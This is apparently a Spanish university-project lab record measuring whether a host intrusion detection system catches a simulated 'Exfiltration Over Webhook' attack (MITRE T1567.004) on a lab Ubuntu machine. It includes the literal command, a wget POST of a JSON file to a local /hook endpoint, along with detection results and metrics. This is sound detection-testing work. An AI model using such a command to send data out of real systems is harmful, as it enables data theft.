---
fase: 3
bloque: fase-03-ampliacion-2
tanda: C
ata_id: ATA043
tecnica: T1567.004
tactica: Exfiltration
version: 1
status: cerrado
fecha: 2026-09-29
---

# Ficha — ATA043 · T1567.004 Exfiltration Over Webhook (`wget` POST JSON → `/hook`) — Linux

> Bloque `fase-03-ampliacion-2` (**tanda C**, 5.º de 5). Generada por `tfg-executor`. **Sin secretos.**
> Estado **`cerrado`**: criterio **v2** → **`iguales`**. Métrica congelada (O1+O2).

## 1. Identificación

| Campo | Valor |
|---|---|
| ATA | **ATA043** |
| Técnica | **T1567.004 — Exfiltration Over Webhook** |
| Táctica | Exfiltration |
| Sistema | Linux (`victima-linux`, Ubuntu Server 24.04.5 LTS) |
| Vía | **manual / custom** |
| Ejecución | usuario `angel`, **sin `sudo`** |
| Capa del HIDS | **`execve`** (`wget`) |

## 2. Fuente del ataque

| Campo | Valor |
|---|---|
| Fuente | `custom` (escrito por el TFG) |
| Herramienta | **`wget`** 1.21.4 (`--post-file`) → endpoint **`/hook`** |
| Efecto | publicación del payload **JSON** en el **webhook local** del receptor |
| Elevación | **no** |
| Guardarraíl | webhook **LOCAL** (`http://192.168.65.1:9090/hook`); nunca servicios reales/cloud |

Artefacto: `.../T1567.004-Exfiltration_Over_Webhook/ATA043_ataque.sh`
(`sha256=b3df4e448b7ab29ed1cb11e33eb547de054caa7a213424bd70abf75f6c514912`).
Señales: `.../ATA043_esperado.csv` (`sha256=14a2acecd21b9b9e2a9f4e28926c9489d71166dd3d5d624ae81a0ca8a3252156`).
Validación humana: **APROBADO 2026-09-29**.
C0: `.../c0/ATA043_logtest.txt` (`sha256=16f18662f6345d5ea3356eb9b6f0e27b568ff1e71d1bd183f785646b9396beab`)
→ `ATA043_preflight.md` (`sha256=6d5a2ad066a65c76dd92a36c8c56a956324015e164d0a21c21cd4230e4954e2e`) **PASA**
(1 evento `wget` → `80792` level 3; sin silenciador).

## 3. Receptor y endpoint `/hook`

El handler `do_POST` **genérico** del receptor (`sink_http.py`) registra **cualquier** ruta (método,
ruta, IP, `len`, `sha256`, `Content-Type`) y responde `200` ⇒ **`/hook` no requirió código nuevo**
(la «extensión mínima» prevista en el plan **no fue necesaria**; se declara).

## 4. Iteraciones

| Iter | t0 (UTC) | t1 (UTC) | Dur | snapshot |
|---|---|---|---|---|
| 1 | `2026-09-29T12:05:59Z` | `2026-09-29T12:06:32Z` | 33 s | `lab-listo` |
| 2 | `2026-09-29T12:08:38Z` | `2026-09-29T12:09:10Z` | 32 s | `lab-listo` |

## 5. Comando ejecutado (literal)

```bash
cd /home/angel/lab-attack/ATA043
bash ATA043_ataque.sh   # wget --header='Content-Type: application/json' --post-file=webhook_payload.json http://192.168.65.1:9090/hook
```

## 6. Evidencia

`Logs/ATA043_iter{1,2}/`: `times.log`, `ejecucion.out`, `deps.txt`, `sink.log`.

**Prueba de exfiltración — `sink.log` con sha256 idéntico al cuerpo JSON enviado:**

| Iter | `sink.log` (`POST /hook … sha256=`) | sha256 enviado (`ejecucion.out`) |
|---|---|---|
| 1 | `1b28889aee458c4f2c8a8053220383815a1ca5347be73e731ffdaee3ffdbe997` | **idéntico** |
| 2 | `1b28889aee458c4f2c8a8053220383815a1ca5347be73e731ffdaee3ffdbe997` | **idéntico** |

(`sink.log` iter1 `sha256=bc4ee594…`; iter2 `sha256=0b033171…`.)

## 7. Ventana extraída

| Iter | `_raw` | victima-linux | Detalle |
|---|---|---|---|
| 1 | 1091 | 1084 | 1085 |
| 2 | 951 | 944 | 945 |

## 8. Resultado

| Iter | filas | deteccion | auto_ruido | ruido_conocido | dudosa | artefacto_ataque | RS1 | RS2 | RS3 | RS4 |
|---|---|---|---|---|---|---|---|---|---|---|
| 1 | 1085 | **1** | 612 | 460 | **0** | 12 | 13 | 1072 | 0 | 0 |
| 2 | 945 | **1** | 610 | 322 | **0** | 12 | 11 | 934 | 0 | 0 |

### 8.1 Detecciones — desglose

| Iter | alertas | `rule_id` distintos | esperadas | sorpresas | primera evidencia |
|---|---|---|---|---|---|
| 1 | 1 | 1 · `{80792}` | **S1** | 0 | `12:06:01.790Z` `Audit: Command: /usr/bin/wget` |
| 2 | 1 | 1 · `{80792}` | **S1** | 0 | `12:08:40.270Z` `Audit: Command: /usr/bin/wget` |

- **`80792`** `Audit: Command: /usr/bin/wget` (señal `S1`, anclado al `cwd`).
- **`dudosa` resueltas:** iter1 **9** PAM → `ruido`; iter2 **8** PAM → `ruido`. **0** filas del ataque
  en `ruido`.

### 8.2 Métrica de detección — **O1 + O2**

| Iter | O1 | `rule_id` | primera evidencia | O2 | desglose det/art/ruido | anexo |
|---|---|---|---|---|---|---|
| 1 | **sí** | `{80792}` | `12:06:01.790Z` `Audit: Command: /usr/bin/wget` | **1/1** (`S1`) | 1 / 12 / 460 | 1 / 1 `rule_id` |
| 2 | **sí** | `{80792}` | `12:08:40.270Z` `Audit: Command: /usr/bin/wget` | **1/1** (`S1`) | 1 / 12 / 322 | 1 / 1 `rule_id` |

## 9. Doble iteración (criterio **v2**) — veredicto **`iguales`**

- **C1′:** ✅ `{80792} == {80792}`. **C2′:** ✅ `|1−1|=0 ≤ 2`. **C3′:** ✅ sin dudosas (9 + 8). Ver
  `Bitacora/ATA043.json`.

## 10. Limitaciones y hallazgos

1. **Endpoint propio sin extensión de código:** el receptor genérico ya sirve `/hook` → se documenta.
2. **El HIDS de host no ve la red:** la detección es el `execve` (`wget`); la prueba es el `sink.log`
   (sha256 del cuerpo JSON).
3. **Distinción de ATA009/ATA010:** distinto endpoint (`/hook` vs `/api/upload` y `/c2/beacon`) y
   formato (JSON de evento).
